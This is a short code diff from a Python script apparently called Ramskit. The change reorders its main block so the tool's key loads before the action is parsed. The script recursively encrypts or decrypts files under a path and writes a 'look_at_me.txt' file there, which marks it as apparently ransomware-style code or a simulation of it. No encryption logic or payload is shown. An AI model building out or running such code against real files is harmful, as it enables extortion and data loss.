@@ -92,12 +92,12 @@ if __name__ == '__main__':
                         help='Action to perform [encrypt/decrypt/generate_key]')
     parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
+    
+    ramskit = Ramskit()
+    key = ramskit.load_key()
 
     action = args.action.lower()
     path = args.path
-
-    ramskit = Ramskit()
-    key = ramskit.load_key()
 
     items: [str] = list(Ramskit.flatten(Ramskit.expand_dir(path)))
     lam = os.path.join(path, 'look_at_me.txt')
